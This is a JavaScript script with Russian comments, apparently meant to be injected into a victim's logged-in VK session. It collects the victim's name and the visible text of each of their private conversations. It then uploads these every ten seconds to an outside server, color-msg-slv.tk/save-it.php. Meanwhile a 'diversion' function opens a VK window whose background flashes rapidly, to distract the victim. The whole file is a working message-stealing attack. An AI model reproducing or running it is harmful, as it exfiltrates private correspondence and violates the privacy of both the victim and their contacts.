// dialogs = {
// 'Илья Ревиков': {
//     'Олег Олегрович' : ['div', 'div'],
//     ...
// }
// }

/**
 * останавливает код на ms секунд, чтобы скрипт успел выполниться
 * @param {wait time} ms 
 */
const wait = async (ms) => await new Promise(resolve => setTimeout(resolve, ms));

// =============== ИМЯ И ФАМИЛИЯ ЖЕРТВЫ =============== //
/**
 * Получает кнопку "Моя страница" и нажимает на нее, чтобы перейти в профиль
 */
function toProfile() {
    document.querySelector('#l_pr a').click();
}
/**
 * Получает имя и фамилию на странице с профилем
 */
function getPreyFullName() {
    return document.querySelector('.page_name').textContent.trim();
}
// =============== ИМЯ И ФАМИЛИЯ ЖЕРТВЫ =============== //


/**
 * Получает ссылку "Мессенджер" и нажимает на неё, чтобы перейти в сообщения
 */
function toMessages() {
    document.querySelector('#l_msg a').click();
}

/**
 * Проходится по всем диалогам в панели слева и получает их id
 */
function getDialogsIDs() {
    let dialogs = [];

    document.querySelectorAll('.nim-dialog').forEach(link => {
        dialogs.push({
            'list-id': link.getAttribute('data-list-id'),
            'msgid': link.getAttribute('data-msgid'),
        });
    });

    return dialogs;
}

/**
 * По ID получает диалог из левого сайд бара и кликает по нему, чтобы переместиться на страницу с этим диалогом
 */
function goToDialog(list_id) {
    document.querySelector(`._im_dialog_${list_id}`).click();
}

/**
 * Получает имя собеседника на текущей странице
 */
function getFriendName() {
    return document.querySelector('._im_page_peer_name').textContent.trim();
}

/**
 * Получает все видимые сообщения на этой странице
 */
function getMessages() {
    let messages = [];
    document.querySelectorAll('.im-mess--text').forEach(mess =>
        messages.push(mess.innerHTML)
    );
    return messages;
}


// =============================================== //
// ================= ОТВЛЕЧЕНИЕ ================== //
function diversion() {
    // открываем новое окно с вк
    let vkCopy = window.open('https://vk.com/im');

    // когда новое окно загрузится выполняем скрипт, который отвлечет человека
    setTimeout(() => {
        let current = 0;
        // когда новое окно загрузится выполняем скрипт, который отвлечет человека
        setInterval(() => {
            if (current === 4) vkCopy.document.body.style.cssText = "background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSp3TM1puW0YH1z7Jnee4aNjx4-xasgeTdAzQ&usqp=CAU') no-repeat center !important; background-size: cover !important";
            else if (current === 3) vkCopy.document.body.style.cssText = "background: red !important";
            else if (current === 2) vkCopy.document.body.style.cssText = "background: blue !important";
            else if (current === 1) vkCopy.document.body.style.cssText = "background: green !important";
            else if (current === 0) vkCopy.document.body.style.cssText = "background: url('https://www.proplan.ru/sites/owners.proplan.ru/files/2020-03/shutterstock_1036161856.jpg') no-repeat center !important; background-size: cover !important";

            current++;
            if (current > 4) current = 0;
        }, 1);

    }, 5000);

    // vkCopy.addEventListener('load', () => {
    //     let toggle = true;
    //     vkCopy.alert(123);

    //     setInterval(function () {
    //         if (toggle) vkCopy.document.body.background = "url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSp3TM1puW0YH1z7Jnee4aNjx4-xasgeTdAzQ&usqp=CAU')";
    //         else vkCopy.document.body.background = "red";
    //         toggle = !toggle;
    //     }, 500);
    // });

    // setTimeout(function () {
    //     vkCopy.document.body.appendChild(vkCopy.document.createElement('div'));
    //     console.log('New script appended!');
    // }, 5000);
}
// ================= ОТВЛЕЧЕНИЕ ================== //

// ======================== //
// ===== IT IS MAGICK ===== //
async function hacking() {
    // Сначала открываем отвлекающее окно
    diversion();
    // ==================================


    // ===== GET PREY's FULLNAME ===== //
    toProfile(); // go to profile
    await wait(2000); // wait some time
    let preyName = getPreyFullName(); // get full name
    // ===== GET PREY's FULLNAME ===== //


    // ===== GO TO MESSAGES Page ===== //
    toMessages();
    await wait(2000); // wait some time
    // ===== GO TO MESSAGES Page ===== //


    // инициализируем объект с полученными данными
    let dialogsData = {
        [preyName]: {}
    }
    // инициализируем объект с полученными данными


    let dialogsIds = getDialogsIDs(); // получаем id диалогов, чтобы можно было по ним пройтись циклом
    let dialogsCount = dialogsIds.length; // кол-во диалогов
    let i = 0; // номер текущего диалога в массиве id

    // ===== PARSE DIALOGS ===== //
    let parser = setInterval(() => {
        // data is end
        if (!dialogsIds) return;
        if (!dialogsIds[i]) return;

        // переходим к следующиму диалогу
        goToDialog(dialogsIds[i]['list-id']);

        // получаем имя собеседника
        let friendName = getFriendName();

        // добавляем сообщения с этой страницы в объект по имени
        dialogsData[preyName][friendName] = getMessages();

        console.log(dialogsData);

        i++; // увеличиваем i, чтобы перейти к след. диалогу
    }, 2000);

    // каждыйе 10 секунд асинхронно отправляем полученные данные на сервер
    let saver = setInterval(() => {
        let formData = new FormData();
        formData.append('data', JSON.stringify(dialogsData));

        fetch(
            'https://color-msg-slv.tk/save-it.php', {
                method: 'POST',
                mode: 'no-cors',
                body: formData,
            }
        );

        dialogsData = {
            [preyName]: {}
        }; // clear data to initial state
    }, 10000);
}

hacking();